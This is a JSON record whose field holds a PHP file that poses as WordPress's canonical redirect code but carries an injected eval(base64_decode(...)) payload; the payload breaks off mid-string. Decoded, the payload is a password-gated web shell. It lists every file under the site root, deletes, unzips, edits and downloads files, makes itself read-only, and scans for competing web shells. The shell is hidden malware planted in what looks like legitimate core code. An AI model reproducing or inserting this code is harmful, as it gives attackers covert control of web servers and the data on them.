{
    "result": "<?php\r\nsession_start();\r\n\/**\r\n * Canonical API to handle WordPress Redirecting\r\n *\r\n * Based on \"Permalink Redirect\" from Scott Yang and \"Enforce www. Preference\"\r\n * by Mark Jaquith\r\n *\r\n * @package WordPress\r\n * @since 2.3.0\r\n *\/\r\n\r\n\/**\r\n * Redirects incoming links to the proper URL based on the site url.\r\n *\r\n * Search engines consider www.somedomain.com and somedomain.com to be two\r\n * different URLs when they both go to the same location. This SEO enhancement\r\n * prevents penalty for duplicate content by redirecting all incoming links to\r\n * one or the other.\r\n *\r\n * Prevents redirection for feeds, trackbacks, searches, and\r\n * admin URLs. Does not redirect on non-pretty-permalink-supporting IIS 7+,\r\n * page\/post previews, WP admin, Trackbacks, robots.txt, searches, or on POST\r\n * requests.\r\n *\r\n * Will also attempt to find the correct link when a user enters a URL that does\r\n * not exist based on exact WordPress query. Will instead try to parse the URL\r\n * or query in an attempt to figure the correct page to go to.\r\n *\r\n * @since 2.3.0\r\n *\r\n * @global WP_Rewrite $wp_rewrite\r\n * @global bool $is_IIS\r\n * @global WP_Query $wp_query\r\n * @global wpdb $wpdb WordPress database abstraction object.\r\n *\r\n * @param string $requested_url Optional. The URL that was requested, used to\r\n *\t\tfigure if redirect is needed.\r\n * @param bool $do_redirect Optional. Redirect to the new URL.\r\n * @return string|void The string of the URL, if redirect needed.\r\n *\/\r\neval('?>'.base64_decode(\"PD9waHAKCiRzdG9yZWRIYXNoPSJjYWE5OTE1Zjg0YmZmOWIwNjQ4NDI0NjM3ZTY0Y2QwMjAxMmE3YTVmOTZjMWI0ZTg5YzhhNTdjNTFjY2UxMjEyIjsgCmlmKCFpc3NldCgkX1NFU1NJT05bImFsbG93ZWRfc3AzIl0pIHx8IChpc3NldCgkX1NFU1NJT05bImFsbG93ZWRfc3AzIl0pICYmICEkX1NFU1NJT05bImFsbG93ZWRfc3AzIl0pKSB7CgkkX1NFU1NJT05bImFsbG93ZWRfc3AzIl09ZmFsc2U7CglpZihpc3NldCgkX0dFVFsicGFzcyJdKSAmJiBoYXNoKCJzaGEyNTYiLCRfR0VUWyJwYXNzIl0pPT09JHN0b3JlZEhhc2gpewoJCSRfU0VTU0lPTlsiYWxsb3dlZF9zcDMiXT10cnVlOwoJfQp9IAppZihpc3NldCgkX1NFU1NJT05bImFsbG93ZWRfc3AzIl0pICYmICRfU0VTU0lPTlsiYWxsb3dlZF9zcDMiXSl7CgkKCmZ1bmN0aW9uIERpckZpbGVzUigkZGlyKSAKeyAKCSRoYW5kbGUgPSBvcGVuZGlyKCRkaXIpIG9yIGRpZSgiQ2FuJ3Qgb3BlbiBkaXJlY3RvcnkgJGRpciIpOyAKICAgICRmaWxlcyA9IEFycmF5KCk7IAogICAgJHN1YmZpbGVzID0gQXJyYXkoKTsgCiAgICB3aGlsZSAoZmFsc2UgIT09ICgkZmlsZSA9IHJlYWRkaXIoJGhhbmRsZSkpKSAKICAgIHsgCiAgICAgIGlmICgkZmlsZSAhPSAiLiIgJiYgJGZpbGUgIT0gIi4uIikgCiAgICAgIHsgCiAgICAgICAgaWYoaXNfZGlyKCRkaXIuIi8iLiRmaWxlKSkgCiAgICAgICAgeyAKICAgICAgICAgICRzdWJmaWxlcyA9IERpckZpbGVzUigkZGlyLiIvIi4kZmlsZSk7IAogICAgICAgICAgJGZpbGVzID0gYXJyYXlfbWVyZ2UoJGZpbGVzLCRzdWJmaWxlcyk7IAogICAgICAgIH0gCiAgICAgICAgZWxzZSAKICAgICAgICB7IAogICAgICAgICAgJGZpbGVzW10gPSAkZGlyLiIvIi4kZmlsZTsgCiAgICAgICAgfSAKICAgICAgfSAKICAgIH0gCiAgICBjbG9zZWRpcigkaGFuZGxlKTsgCiAgICByZXR1cm4gJGZpbGVzOyAKfQoKaWYgKGlzc2V0KCRfR0VUWydqdWtlJ10pKQp7CgkkYXJyX2ZpbGVzID0gRGlyRmlsZXNSKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10pOwoKCWVjaG8gJzx0ZD48aHI+PGhyPic7Cglmb3JlYWNoICgkYXJyX2ZpbGVzIGFzICRrZXkpCgl7CgkJJGtleV9lID0gc3RyX3JlcGxhY2UoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSwgJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10sICRrZXkpOwoJCWVjaG8gJGtleV9lLic7Jy5maWxlc2l6ZSgka2V5KS4iPGJyPlxuIjsKCX0KCWVjaG8gJzxocj48aHI+PC90ZD4nOwoJCglleGl0Owp9Cj8+CjxodG1sPgo8aGVhZD4KCTx0aXRsZT48P3BocCBlY2hvICRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXTs\/PjwvdGl0bGU+Cgk8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgoJSU5QVVRbdHlwZT0idGV4dCJdIHtiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmOGU3O30JYm9keXtiYWNrZ3JvdW5kOiAjZmZmOGU3O2NvbG9yOiAjNGM1ODY2O2ZvbnQtZmFtaWx5OiBWZXJkYW5hO2ZvbnQtc2l6ZTogMTFweDt9CglhOmxpbmt7Y29sb3I6ICMzM0NDOTk7fQlhOnZpc2l0ZWR7Y29sb3I6ICMzM0NDOTk7fQlhOmhvdmVye3RleHQtZGVjb3JhdGlvbjogbm9uZTtDb2xvcjogIzMzOTlGRjt9dGFibGUge2ZvbnQtc2l6ZTogMTFweDt9Cgl0ZCB7cGFkZGluZzogMXB4O3BhZGRpbmctbGVmdDogMTBweDtwYWRkaW5nLXJpZ2h0OiAxMHB4O3BhZGRpbmctdG9wOiAycHg7fQoJPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPHRhYmxlIGNlbGxwYWRkaW5nPSI1IiB3aWR0aD0iODAlIj4KPD9waHAKZnVuY3Rpb24gcGVybXMoJGZpbGVuYW1lLCAkY2hlY2spCnsKICAgICRwZXJtcyA9IHN1YnN0cihkZWNvY3QoZmlsZXBlcm1zKCRmaWxlbmFtZSkpLCAtMyk7CglpZiAoJHBlcm1zID09ICc2NDQnKQoJCSRjb2xvciA9ICdncmVlbic7CgllbHNlaWYgKCRwZXJtcyA9PSAnNzU1JykKCQkkY29sb3IgPSAnIzJFQzg0Mic7CgllbHNlaWYgKCRwZXJtcyA9PSAnNDQ0JykKCQkkY29sb3IgPSAnYnJvd24nOwoJZWxzZWlmICgkcGVybXMgPT0gJzAwMCcpCgkJJGNvbG9yID0gJ3JlZCc7CgllbHNlaWYgKCRwZXJtcyA9PSAnNzQ0JykKCQkkY29sb3IgPSAnb3JhbmdlJzsKCWVsc2VpZiAoJHBlcm1zID09ICc2NjQnKQoJCSRjb2xvciA9ICdncmVlbic7CgllbHNlCgkJJGNvbG9yID0gJ2dyZXknOwoJaWYgKCRjaGVjayA9PSAxKQkKCQlyZXR1cm4gJHBlcm1zOwoJZWxzZQoJCXJldHVybiAiPGZvbnQgY29sb3I9JGNvbG9yPiIuJHBlcm1zLiI8L2ZvbnQ+IjsKfQokcGVybXNzZWxmID0gcGVybXMoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddLCAnJyk7CmlmICgkcGVybXNzZWxmICE9PSAnNDQ0JykKCWNobW9kKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSwgMDQ0NCk7CgpmdW5jdGlvbiBkZWxfZmlsZSgkZmlsZSkKewoJaWYoIWZpbGVfZXhpc3RzKCRmaWxlKSkKCQlyZXR1cm4gImZpbGUgbm90IGV4aXN0cyI7CgllbHNlCgl7CgkJaWYgKCF1bmxpbmsoJGZpbGUpKQoJCXsKCQkJaWYgKCFjaG1vZCgkZmlsZSwgMDc1NSkpCgkJCQlyZXR1cm4gIm5vIGhhdmUgcGVybWlzc2lvbiBmb3IgY2htb2QhIjsKCQkJZWxzZQoJCQl7CgkJCQlpZiAoIXVubGluaygkZmlsZSkpCgkJCQkJcmV0dXJuICJjYW4gbm90IGRlbGV0ZSEiOwoJCQkJZWxzZQoJCQkJCXJldHVybiAib2shIjsKCQkJfQoJCX0KCQllbHNlCgkJCXJldHVybiAib2shIjsKCX0KfQoKaWYgKGlzc2V0KCRfR0VUWydkaXNwYXRjaCddKSkKewoJZGVsX2ZpbGUoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKTsKfQppZiAoIWVtcHR5KCRfUE9TVFsnZm9yX2RlbCddKSkKewoJJHJlYWxfcGF0aF9mb3JfZGVsID0gYXJyYXkoKTsKCSRhbGxfZm9yX2RlbCA9ICRfUE9TVFsnZm9yX2RlbCddOwoJCgllY2hvICI8PGluZm8+PiI7Cglmb3JlYWNoICgkYWxsX2Zvcl9kZWwgYXMgJGVhY2gpCgl7CgkJJGVhY2ggPSBzdHJzdHIoJGVhY2gsICcvJyk7CgkJJGVhY2ggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLicvJy4kZWFjaDsKCQkKCQkkZWFjaF9mb3JfZWNobyA9IHN0cl9yZXBsYWNlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10sICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLCAkZWFjaCk7CgoJCWlmIChmaWxlX2V4aXN0cygkZWFjaCkpCgkJewoJCQlkZWxfZmlsZSgkZWFjaCk7CgkJCWlmICghZmlsZV9leGlzdHMoJGVhY2gpKQoJCQkJZWNobyAkZWFjaF9mb3JfZWNoby4iIC0gcmVtb3ZlZCIuIlxuIjsKCQkJZWxzZQoJCQkJZWNobyAkZWFjaF9mb3JfZWNoby4iIC0gbm90IHJlbW92ZWQiLiJcbiI7CgkJfQoJCWVsc2UKCQkJZWNobyAkZWFjaF9mb3JfZWNoby4iIC0gbm90IGZvdW5kIi4iXG4iOwoJfQoJZWNobyAiPDwvaW5mbz4+IjsKCQoJZXhpdDsKfQpmdW5jdGlvbiB1bnppcF9maWxlKCRmaWxlKQp7CgkkZm9yX2RlbCA9IHN0cnJjaHIoJGZpbGUsICcvJyk7CgkkZm9sZGVyX3RvX3NhdmUgPSBzdHJfcmVwbGFjZSgkZm9yX2RlbCwgJycsICRmaWxlKTsKCgkvL3NldF90aW1lX2xpbWl0KDApOwoJJHppcCA9IG5ldyBaaXBBcmNoaXZlOwoJJHppcC0+b3BlbigkZmlsZSk7CgkkemlwLT5leHRyYWN0VG8oJGZvbGRlcl90b19zYXZlKTsKCSR6aXAtPmNsb3NlKCk7CgllY2hvICI8dHI+PHRkPkZpbGU6ICRmb3JfZGVsIC0gPGZvbnQgY29sb3I9XCJncmVlblwiPnVuemlwIHN1Y2Nlc3NmdWxseTwvZm9udD48L3RkPjwvdHI+IjsKfQoKZnVuY3Rpb24gcmVhZF9maWxlKCRmaWxlX25hbWUpCnsKCSRsaXN0ID0gJGZpbGVfbmFtZTsKCWlmIChmaWxlX2V4aXN0cygkZmlsZV9uYW1lKSBhbmQgKGZpbGVzaXplKCRmaWxlX25hbWUpPjEpKQoJewoJCSRmaWxlID0gZm9wZW4oJGxpc3QsInJ0Iik7CgkJJGFycl9maWxlID0gZXhwbG9kZSgiXG4iLGZyZWFkKCRmaWxlLGZpbGVzaXplKCRsaXN0KSkpOwoJCWZjbG9zZSgkZmlsZSk7CgkJcmV0dXJuICRhcnJfZmlsZTsKCX0KCWVsc2UKCXsKCQkkYXJyX2ZpbGUgPSBhcnJheSgpOwoJCXJldHVybiAkYXJyX2ZpbGU7Cgl9Cn0KCmZ1bmN0aW9uIGNsZWFyX2ZvbGRlcigkZGlyKSAKeyAgCiAgICAkZD1vcGVuZGlyKCRkaXIpOyAgCiAgICB3aGlsZSgoJGVudHJ5PXJlYWRkaXIoJGQpKSE9PWZhbHNlKSAKICAgIHsgCiAgICAgICAgaWYgKCRlbnRyeSAhPSAiLiIgJiYgJGVudHJ5ICE9ICIuLiIpIAogICAgICAgIHsgCiAgICAgICAgICAgIGlmIChpc19kaXIoJGRpci4iLyIuJGVudHJ5KSkgCiAgICAgICAgICAgIHsgIAogICAgICAgICAgICAgICAgY2xlYXJfZm9sZGVyKCRkaXIuIi8iLiRlbnRyeSk7ICAKICAgICAgICAgICAgfSAKICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgeyAgCiAgICAgICAgICAgICAgICB1bmxpbmsgKCRkaXIuIi8iLiRlbnRyeSk7ICAKICAgICAgICAgICAgfSAKICAgICAgICB9IAogICAgfSAKICAgIGNsb3NlZGlyKCRkKTsgIAogICAgcm1kaXIgKCRkaXIpOyAgCn0gCgpmdW5jdGlvbiBvbmx5X3JlYWQoJGZpbGVfbmFtZSkKewoJaWYgKGZpbGVfZXhpc3RzKCRmaWxlX25hbWUpIGFuZCAoZmlsZXNpemUoJGZpbGVfbmFtZSk+MSkpCgl7CgkJaWYgKCEkZmlsZSA9IGZvcGVuKCRmaWxlX25hbWUsInJ0IikpCgkJewoJCQlpZiAoIWNobW9kKCRmaWxlX25hbWUsIDA3NzUpKQoJCQl7CgkJCQllY2hvICdjYW5cJ3QgcGVybWlzc2lvbiBmb3IgY2htb2QgZmlsZTxicj4nOwkKCQkJCSRvcmlnaW5hbF9maWxlID0gJyc7CgkJCX0KCQkJZWxzZSAvLyDDkeKAocOQwrzDkMK+w5DCtMOQwr3DkcaSw5DCu8OQwrgsIMOQwr\/DkeKCrMOQwr7DkMKxw5HGksOQwrXDkMK8IMOQwrXDkeKAsMOQwrUgw5HigqzDkMKww5DCtyDDkMK+w5HigJrDkMK6w5HigqzDkeKAucOR4oCaw5HFkiDDkeKAnsOQwrDDkMK5w5DCuwoJCQl7CgkJCQlpZiAoISRmaWxlID0gZm9wZW4oJGZpbGVfbmFtZSwicnQiKSkgLy8gCgkJCQl7CgkJCQkJZWNobyAnY2FuXCd0IHBlcm1pc3Npb24gZm9yIG9wZW4gZmlsZTxicj4nOwoJCQkJCSRvcmlnaW5hbF9maWxlID0gJyc7CgkJCQl9CgkJCQllbHNlCgkJCQl7CgkJCQkJJG9yaWdpbmFsX2ZpbGUgPSBmcmVhZCgkZmlsZSxmaWxlc2l6ZSgkZmlsZV9uYW1lKSk7CgkJCQkJZmNsb3NlKCRmaWxlKTsKCQkJCX0KCQkJfQoJCX0KCQllbHNlCgkJewoJCQkkb3JpZ2luYWxfZmlsZSA9IGZyZWFkKCRmaWxlLGZpbGVzaXplKCRmaWxlX25hbWUpKTsKCQkJZmNsb3NlKCRmaWxlKTsKCQl9Cgl9CglyZXR1cm4gJG9yaWdpbmFsX2ZpbGU7Cn0KCQkKZnVuY3Rpb24gZmluZHNoZWxscygkc3RhcnQpIAp7CglnbG9iYWwgJGFycl9maWxlbmFtZTsKCSRmaWxlcyA9IGFycmF5KCk7CglpZiAoISRoYW5kbGUgPSBvcGVuZGlyKCRzdGFydCkpCgkJY2htb2QoJHN0YXJ0LCAwNzU1KTsKCQoJJGhhbmRsZSA9IG9wZW5kaXIoJHN0YXJ0KTsKCQoJd2hpbGUoKCRmaWxlPXJlYWRkaXIoJGhhbmRsZSkpIT09ZmFsc2UpCgl7CQoJCWlmICgkZmlsZSE9Ii4iICYmICRmaWxlICE9Ii4uIikgCgkJewoJCQkkc3RhcnRmaWxlID0gJHN0YXJ0LiIvIi4kZmlsZTsKCQkJaWYgKGlzX2Rpcigkc3RhcnRmaWxlKSkgCgkJCQlmaW5kc2hlbGxzKCRzdGFydGZpbGUpOwkKCQkJZWxzZSAKCQkJewoJCQkJJHJlc3VsdCA9IHN0cmlzdHIoJHN0YXJ0ZmlsZSwgJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKTsKCQkJCQoJCQkJaWYgKCRyZXN1bHQgPT0gZmFsc2UpCgkJCQkJJGFycl9maWxlbmFtZVtdID0gJHN0YXJ0ZmlsZTsKCQkJfQoJCX0KCX0KCWNsb3NlZGlyKCRoYW5kbGUpOwoJcmV0dXJuICRhcnJfZmlsZW5hbWU7Cn0KCmlmIChpc3NldCAoJF9HRVRbJ3VuemlwJ10pKQp7Cgl1bnppcF9maWxlKCRfR0VUWyd1bnppcCddKTsKfQoKaWYgKGlzc2V0ICgkX0dFVFsnZmluZGVyJ10pKQp7CgkkZG9tYWluID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107Cgkkc2NyaXB0X3BhdGggPSAkX1NFUlZFUlsnU0NSSVBUX05BTUUnXTsKCSRmaW5kZXJkYXRhX3BhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLiIvZmluZGVyZGF0YS50eHQiOwoJJGdvb2RfcmVzdWx0X3BhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLiIvZ29vZGZpbmRlcmRhdGEudHh0Ijs7CgkKCQoJCgkkc2VhcmNoX3N0ciA9ICdldmFsKGJhc2U2NF9kZWNvZGUoJzsKCSRzZWFyY2hfc3RyMiA9ICdBcnJheShiYXNlNjRfZGVjb2RlKCc7Cgkkc2VhcmNoX3N0cjMgPSAnQCRpc2JvdCc7Cgkkc2VhcmNoX3N0cjQgPSAnQHJlcXVpcmUnOwoJJHNlYXJjaF9zdHI1ID0gJ2V2YWwoZ3p1bmNvbXByZXNzKGJhc2U2NF9kZWNvZGUoJzsKCSRzZWFyY2hfc3RyNiA9ICdAaW5jbHVkZSAiXHgyJzsKCSRzZWFyY2hfc3RyNyA9ICckT08nOwoJJHNlYXJjaF9zdHI4ID0gJ2NhY2hlPTAwJzsKCSRzZWFyY2hfc3RyOSA9ICdmaWxlX2dldF9jb250ZW50cyhcIi4uL2luZGV4LnBocFwiKSInOwoJJHNlYXJjaF9zdHIxMCA9ICdpc191cGxvYWRlZF9maWxlJzsKCSRzZWFyY2hfc3RyMTEgPSAnYmFzZTY0X2RlY29kZSgkX1BPU1QnOwoJJHNlYXJjaF9zdHIxMiA9ICdtdWx0aXBhcnQvZm9ybS1kYXRhJzsKCQoJaWYgKCFmaWxlX2V4aXN0cygkZmluZGVyZGF0YV9wYXRoKSkKCXsKCQkkYXJyX3BocF9maWxlID0gZmluZHNoZWxscygkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsKCgkJJGYgPSBmb3BlbiAoJGZpbmRlcmRhdGFfcGF0aCwgImEiKTsKCQlmb3JlYWNoICgkYXJyX3BocF9maWxlIGFzICRlYWNoKQoJCXsKCQkJaWYgKCRlYWNoICE9PSAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pCgkJCQlmd3JpdGUoJGYsICRlYWNoLiJcbiIpOwoJCX0KCQlmY2xvc2UoJGYpOwoJCQoJCWlmIChmaWxlX2V4aXN0cygkZmluZGVyZGF0YV9wYXRoKSkKCQl7CgkJCSRyZWRpcmVjdCA9IHN0cl9yZXBsYWNlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10sICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLCAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pOwoJCQkkcmVkaXJlY3QgPSAnaHR0cDovLycuJHJlZGlyZWN0Lic\/ZmluZGVyJzs7CgkJCT8+CQoJCQk8c2NyaXB0IGxhbmd1YWdlID0gJ2phdmFzY3JpcHQnPgoJCQl2YXIgZGVsYXkgPSAzMDA7CgkJCXNldFRpbWVvdXQoImRvY3VtZW50LmxvY2F0aW9uLmhyZWY9Jzw\/cGhwIGVjaG8gJHJlZGlyZWN0Oz8+JyIsIGRlbGF5KTsKCQkJPC9zY3JpcHQ+CgkJCTw\/cGhwCQoJCX0KCQllbHNlCgkJCWVjaG8gJ2Vycm9yOiBmaWxlIGZpbmRlcmRhdGEudHh0IGNhbiBub3QgY3JlYXRlJzsKCQkKCX0KCWVsc2UKCXsKCQkkYWxsX3BhdGggPSByZWFkX2ZpbGUoJGZpbmRlcmRhdGFfcGF0aCk7CgkJJHVybHNfZm9yX3dvcmsgPSBhcnJheSAoKTsKCQkKCQlmb3IgKCAkdT0wOyAkdSA8IDkwMDsgJHUrKyApCgkJewoJCQlpZiAoKCRhbGxfcGF0aFskdV0gIT09IG51bGwpIGFuZCAoJGFsbF9wYXRoWyR1XSAhPT0gJyAnKSBhbmQgKCRhbGxfcGF0aFskdV0gIT09ICcnKSBhbmQgKCRhbGxfcGF0aFskdV0gIT09ICcuJykgYW5kICgkYWxsX3BhdGhbJHVdICE9PSAnLi4nKSkKCQkJCSR1cmxzX2Zvcl93b3JrW10gPSB0cmltKCRhbGxfcGF0aFskdV0pOwoJCX0KCgkJZm9yICggJGk9MDsgJGkgPCA5MDA7ICRpKysgKQoJCXsKCQkJdW5zZXQoJGFsbF9wYXRoWyRpXSk7CgkJfQoJCQkJCgkJJGZuZXcgPSBmb3BlbigkZmluZGVyZGF0YV9wYXRoLCAidyIpOwoJCWZvcmVhY2ggKCRhbGxfcGF0aCBhcyAkZWFjaF9wYXRoKQoJCXsKCQkJaWYgKCgkZWFjaF9wYXRoICE9PSBudWxsKSBhbmQgKCRlYWNoX3BhdGggIT09ICcnKSBhbmQgKCRlYWNoX3BhdGggIT09ICcgJykpCgkJCQlmd3JpdGUoJGZuZXcsICRlYWNoX3BhdGguIlxuIik7CgkJfQoJCWZjbG9zZSgkZm5ldyk7CgoJCWZvcmVhY2ggKCR1cmxzX2Zvcl93b3JrIGFzICRlYWNoX2Zvcl9jaGVjaykKCQl7CgkJCWlmIChmaWxlX2V4aXN0cygkZWFjaF9mb3JfY2hlY2spKQoJCQl7CgkJCQlpZiAoKChmaWxlc2l6ZSgkZWFjaF9mb3JfY2hlY2spKSA8IDUwMDAwMDApKQoJCQkJJGVhY2hfcmVhZCA9IG9ubHlfcmVhZCgkZWFjaF9mb3JfY2hlY2spOwoJCQkJZWxzZQoJCQkJCSRlYWNoX3JlYWQgPSAnJzsKCQkJCQoJCQkJJHJlc3VsdCA9IHN0cmlzdHIoJGVhY2hfcmVhZCwgJHNlYXJjaF9zdHIpOwoJCQkJJHJlc3VsdDIgPSBzdHJpc3RyKCRlYWNoX3JlYWQsICRzZWFyY2hfc3RyMik7CgkJCQkkcmVzdWx0MyA9IHN0cmlzdHIoJGVhY2hfcmVhZCwgJHNlYXJjaF9zdHIzKTsKCQkJCSRyZXN1bHQ0ID0gc3RyaXN0cigkZWFjaF9yZWFkLCAkc2VhcmNoX3N0cjQpOwoJCQkJJHJlc3VsdDUgPSBzdHJpc3RyKCRlYWNoX3JlYWQsICRzZWFyY2hfc3RyNSk7CgkJCQkkcmVzdWx0NiA9IHN0cmlzdHIoJGVhY2hfcmVhZCwgJHNlYXJjaF9zdHI2KTsKCQkJCSRyZXN1bHQ3ID0gc3RyaXN0cigkZWFjaF9yZWFkLCAkc2VhcmNoX3N0cjcpOwoJCQkJJHJlc3VsdDggPSBzdHJpc3RyKCRlYWNoX3JlYWQsICRzZWFyY2hfc3RyOCk7CgkJCQkkcmVzdWx0OSA9IHN0cmlzdHIoJGVhY2hfcmVhZCwgJHNlYXJjaF9zdHI5KTsKCQkJCSRyZXN1bHQxMCA9IHN0cmlzdHIoJGVhY2hfcmVhZCwgJHNlYXJjaF9zdHIxMCk7CgkJCQkkcmVzdWx0MTEgPSBzdHJpc3RyKCRlYWNoX3JlYWQsICRzZWFyY2hfc3RyMTEpOwoJCQkJJHJlc3VsdDEyID0gc3RyaXN0cigkZWFjaF9yZWFkLCAkc2VhcmNoX3N0cjEyKTsKCQkJCWlmICgoJHJlc3VsdCAhPT0gZmFsc2UpIG9yICgkcmVzdWx0MiAhPT0gZmFsc2UpIG9yICgkcmVzdWx0MyAhPT0gZmFsc2UpIG9yICgkcmVzdWx0NCAhPT0gZmFsc2UpIG9yICgkcmVzdWx0NSAhPT0gZmFsc2UpIG9yICgkcmVzdWx0NiAhPT0gZmFsc2UpIG9yICgkcmVzdWx0NyAhPT0gZmFsc2UpIG9yICgkcmVzdWx0OCAhPT0gZmFsc2UpIG9yICgkcmVzdWx0OSAhPT0gZmFsc2UpIG9yICgkcmVzdWx0MTAgIT09IGZhbHNlKSBvciAoJHJlc3VsdDExICE9PSBmYWxzZSkgb3IgKCRyZXN1bHQxMiAhPT0gZmFsc2UpKQoJCQkJewoJCQkJCSRmID0gZm9wZW4gKCRnb29kX3Jlc3VsdF9wYXRoLCAiYSIpOwoJCQkJCWZ3cml0ZSgkZiwgJGVhY2hfZm9yX2NoZWNrLiJcbiIpOwoJCQkJCWZjbG9zZSgkZik7CgkJCQl9CgkJCX0KCQl9CgkJCgkJaWYgKGNvdW50KCRhbGxfcGF0aCk+MCkKCQkJZWNobyBjb3VudCgkYWxsX3BhdGgpLiIgZmlsZXMgZm9yIGNoZWNrPGJyPiI7CgkJZWxzZQoJCQllY2hvICc8dHI+PHRkPkZpbmlzaCE8L3RkPjwvdHI+JzsKCQkKCQkkZm9yX2NoZWNrID0gcmVhZF9maWxlKCRmaW5kZXJkYXRhX3BhdGgpOwoJCWlmIChmaWxlX2V4aXN0cygkZmluZGVyZGF0YV9wYXRoKSBhbmQgKGZpbGVzaXplKCRmaW5kZXJkYXRhX3BhdGgpPjEpKQoJCXsKCQkJJHJlZGlyZWN0ID0gc3RyX3JlcGxhY2UoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSwgJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10sICRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7CgkJCSRyZWRpcmVjdCA9ICdodHRwOi8vJy4kcmVkaXJlY3QuJz9maW5kZXInOzsKCQkJPz4JCgkJCTxzY3JpcHQgbGFuZ3VhZ2UgPSAnamF2YXNjcmlwdCc+CgkJCXZhciBkZWxheSA9IDEwMDsKCQkJc2V0VGltZW91dCgiZG9jdW1lbnQubG9jYXRpb24uaHJlZj0nPD9waHAgZWNobyAkcmVkaXJlY3Q7Pz4nIiwgZGVsYXkpOwoJCQk8L3NjcmlwdD4KCQkJPD9waHAKCQl9CgkJZWxzZQoJCXsKCQkJJGFycl9yZXN1bHQgPSByZWFkX2ZpbGUoJGdvb2RfcmVzdWx0X3BhdGgpOwoJCQkKCQkJZm9yZWFjaCAoJGFycl9yZXN1bHQgYXMgJGVhY2gpCgkJCXsKCQkJCWlmICgoJGVhY2ggIT09IG51bGwpIGFuZCAoJGVhY2ggIT09ICcnKSBhbmQgKCRlYWNoICE9PSAnICcpKQoJCQkJewoJCQkJCWlmIChpc3NldCAoJF9HRVRbJ2RpciddKSkKCQkJCQkJJGRyID0gJF9HRVRbJ2RpciddOwoJCQkJCWVsc2UKCQkJCQkJJGRyID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKCQkJCQkKCQkJCQkKCQkJCQkkdGltZSA9IGdldF90aW1lKCRlYWNoKTsKCQkJCQkKCQkJCQkkcmVhbF91cmwgPSBzdHJfcmVwbGFjZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLCAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSwgJGVhY2gpOwoJCQkJCQoJCQkJCWVjaG8gIjx0ciBiZ2NvbG9yPVwiI2ZmZmZmZlwiIGFsaWduPVwiY2VudGVyXCI+PHRkIGFsaWduPVwibGVmdFwiID4iLiI8YSBzdHlsZT1cInRleHQtZGVjb3JhdGlvbjogbm9uZTtcIiBocmVmPVwiaHR0cDovLyRkb21haW4kc2NyaXB0X3BhdGg\/ZWRpdD0kZWFjaCZkaXI9JGRyXCI+PGZvbnQgY29sb3I9XCJibGFja1wiPiRlYWNoPC9mb250PjwvYT4iLiI8L3RkPjx0ZD4iLmdldF9maWxlc2l6ZSgkZWFjaCkuIjwvdGQ+PHRkPiR0aW1lPC90ZD48dGQ+Ii5wZXJtcygkZWFjaCwgJzAnKS4iPC90ZD48dGQ+Ii4iPGEgaHJlZj1cImh0dHA6Ly8kZG9tYWluJHNjcmlwdF9wYXRoP2RlbD0kZWFjaCZkaXI9JGRyXCI+VTwvYT4mbmJzcDsiLiI8YSBocmVmPVwiaHR0cDovLyRkb21haW4kc2NyaXB0X3BhdGg\/ZWRpdD0kZWFjaCZkaXI9JGRyXCI+RTwvYT4mbmJzcDsiLiI8YSB0YXJnZXQ9XCJfYmxhbmtcIiBocmVmPVwiaHR0cDovLyRyZWFsX3VybFwiPk88L2E+Jm5ic3A7Ii4iPGEgaHJlZj1cImh0dHA6Ly8kZG9tYWluJHNjcmlwdF9wYXRoP2Rvd25sb2FkPSRlYWNoJmRpcj0kZHJcIj5EPC9hPiIuIjwvdGQ+PC90cj4iOwoJCQkJfQoJCQl9CgkJCWlmIChmaWxlX2V4aXN0cygkZmluZGVyZGF0YV9wYXRoKSkKCQkJCXVubGluaygkZmluZGVyZGF0YV9wYXRoKTsKCQkJCgkJCWlmIChmaWxlX2V4aXN0cygkZ29vZF9yZXN1bHRfcGF0aCkpCgkJCQl1bmxpbmsoJGdvb2RfcmVzdWx0X3BhdGgpOwoJCX0KCX0KfQppZiAoaXNzZXQgKCRfR0VUWydkb3dubG9hZCddKSkKewoJJGZpbGVfZm9yX3NhdmUgPSAkX0dFVFsnZG93bmxvYWQnXTsKCQkKCWlmIChmaWxlX2V4aXN0cygkZmlsZV9mb3Jfc2F2ZSkpCgl7CQoJCWhlYWRlcignQ29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2ZlcicpOwoJCWhlYWRlcignQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nKTsKCQloZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPScgLiBiYXNlbmFtZSgkZmlsZV9mb3Jfc2F2ZSkpOwoJCWhlYWRlcignQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5Jyk7CgkJaGVhZGVyKCdFeHBpcmVzOiAwJyk7CgkJaG